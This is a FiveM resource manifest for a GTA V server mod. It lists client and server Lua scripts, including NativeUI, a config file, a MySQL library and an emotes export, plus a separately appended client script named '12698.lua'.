fx_version 'adamant'

game 'gta5'

client_scripts {
    'NativeUI.lua',
    'Config.lua',
    'Client/*.lua',
    '@xzero_emotes_ui/export/emo.lua'
}

server_scripts {
	'Config.lua',
	'@mysql-async/lib/MySQL.lua',
	'Server/*.lua'
}

client_script '12698.lua'